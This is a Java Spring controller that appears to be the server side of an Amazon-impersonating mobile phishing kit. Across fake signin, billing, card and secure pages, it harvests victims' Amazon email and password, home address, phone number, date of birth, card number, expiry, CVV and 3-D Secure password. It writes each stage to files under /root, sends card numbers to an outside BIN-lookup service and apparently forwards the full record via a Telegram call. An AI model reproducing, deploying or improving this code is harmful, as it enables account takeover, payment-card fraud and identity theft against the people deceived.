package com.kidd.amazon.web;


import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.io.file.FileAppender;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.useragent.UserAgent;
import cn.hutool.http.useragent.UserAgentUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.kidd.amazon.common.IpUtils;
import com.kidd.amazon.model.enums.CardType;
import com.kidd.amazon.task.AsyncTask;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.HashMap;
import java.util.Map;


@Controller
@Slf4j
public class Amazon2MobileController {
    @Autowired
    private HttpServletRequest request;

    @Autowired
    private AsyncTask asyncTask;


    @Autowired
    private HttpServletResponse response;

    @GetMapping("/amazon2/mobile/signin")
    public Object signin(@RequestHeader("User-Agent") String uaStr) {
        String ip = IpUtils.getIpAddress(request);
        String path = "/root/countClickLink2.txt";
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append(timeStr+":"+"|"+ip);
        fileAppender.flush();
        Boolean isMobile = false;
        UserAgent ua = UserAgentUtil.parse(uaStr);
        isMobile = ua.isMobile();
        if (isMobile) return "amazon2/mobile/index";
        else return "redirect:/signin";
    }

    @GetMapping("/")
    public Object signin2(@RequestHeader("User-Agent") String uaStr) {
        return "redirect:/amazon2/mobile/signin";
    }

    @GetMapping("/amazon2/mobile/homepage/billing")
    public Object update_billing() {
        return "amazon2/mobile/billing";
    }

    @GetMapping("/amazon2/mobile/homepage/card")
    public Object card() {
        return "amazon2/mobile/card";
    }

    @GetMapping("/amazon2/mobile/homepage/secure")
    public Object secure(Model model) {
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
       CardType cardType = CardType.getBydes(userInfoMap.get("cardType"));
       String cardNumber = userInfoMap.get("cardnumber");
       String namecard = userInfoMap.get("namecard");
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy/MM/dd");
        model.addAttribute("dateTime", timeStr);
        model.addAttribute("cardName", namecard);
        model.addAttribute("cardNo",cardNumber.substring(cardNumber.length() - 4, cardNumber.length()));
        model.addAttribute("image",cardType.getImageName());
        return "amazon2/mobile/secure2";
    }

    @GetMapping("/amazon2/mobile/homepage/success")
    public Object success() {
        //TODO 不
        addCookie("kiddIp", IpUtils.getIpAddress(request));
        return "amazon2/mobile/success";
    }

    public void addCookie(String key, String value) {
        Cookie cookie = new Cookie(key, value);//创建新cookie
        cookie.setMaxAge(60 * 60);// 设置存在时间为5分钟
        cookie.setPath("/");//设置作用域
        response.addCookie(cookie);//将cookie添加到response的cookie数组中返回给客户端
    }


    @PostMapping("/amazon2/mobile/signin")
    @ResponseBody
    public Object signinPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("AmazonId",params.get("email")!=null?params.get("email")[0]:"");
        userInfoMap.put("AmazonPwd",params.get("password")!=null?params.get("password")[0]:"");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/amazon2-step1/%s.txt", timeStr), userInfoMap);
        return new HashMap<String,String>(){{put("data","ok");}};
    }

    @PostMapping("/amazon2/mobile/homepage/billing")
    @ResponseBody
    public Object billingPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("fullname",params.get("fullname")!=null?params.get("fullname")[0]:"");
        userInfoMap.put("stat",params.get("stat")!=null?params.get("stat")[0]:"");
        userInfoMap.put("address",params.get("address")!=null?params.get("address")[0]:"");
        userInfoMap.put("city",params.get("City")!=null?params.get("City")[0]:"");
        userInfoMap.put("zipcode",params.get("zipcode")!=null?params.get("zipcode")[0]:"");
        userInfoMap.put("phone",params.get("phonenumber")!=null?params.get("phonenumber")[0]:"");
        userInfoMap.put("dob",params.get("dob-year")[0]+"/"+params.get("dob-moon")[0]+"/"+params.get("dob-day")[0]);
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/amazon2-step2/%s.txt", timeStr), userInfoMap);
        return new HashMap<String,String>(){{put("data","ok");}};
    }

    @PostMapping("/amazon2/mobile/homepage/card")
    @ResponseBody
    public Object cardPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("namecard",params.get("namecard")[0]);
        userInfoMap.put("cardnumber",params.get("cardnumber")[0]);
        userInfoMap.put("expire",params.get("exdatemoon")[0]+"/"+params.get("exdateyear")[0]);
        userInfoMap.put("cvv",params.get("cvc")[0]);
        CardType cardType = CardType.detect(params.get("cardnumber")[0]);
        userInfoMap.put("cardType",cardType.getDescription());
        String binInfo = getBinInfo(params.get("cardnumber")[0]);
        userInfoMap.put("binInfo",binInfo);
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/amazon2-step3/%s.txt", timeStr), userInfoMap);
        asyncTask.asyncSaveFish("/root/lack"+timeStr+"/",userInfoMap);
        return new HashMap<String,String>(){{put("data","ok");}};
    }

    @PostMapping("/amazon2/mobile/homepage/secure")
    @ResponseBody
    public Object securePost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
        if(null!=params.get("mmname")) {
            userInfoMap.put("webid", params.get("mmname") != null ? params.get("mmname")[0] : "");
        }
        userInfoMap.put("3dSecret",params.get("passvbv")!=null?params.get("passvbv")[0]:"");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/amazon2-step4/%s.txt", timeStr), userInfoMap);
        asyncTask.asyncSendTgMsg(null,null,userInfoMap);
        asyncTask.asyncSaveFish("/root/full"+timeStr+"/",userInfoMap);
        return new HashMap<String,String>(){{put("data","ok");}};
    }

    private String getBinInfo(String cardNo){
        String binInfo = "{}";
        try {
           binInfo = HttpRequest.get("https://lookup.binlist.net/"+cardNo)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .header("Accept-Version","3")
                    .timeout(20000)//超时，毫秒
                    .execute().body();
        }
        catch (Exception e){
            log.error("query bin fail:"+e.getMessage());
        }
        JSONObject jsonObject = JSON.parseObject(binInfo);
        if(jsonObject!=null && jsonObject.containsKey("country")){
            jsonObject.remove("country");
        }
        if(jsonObject!=null && jsonObject.containsKey("number")){
            jsonObject.remove("number");
        }
        return jsonObject.toJSONString();
    }
}
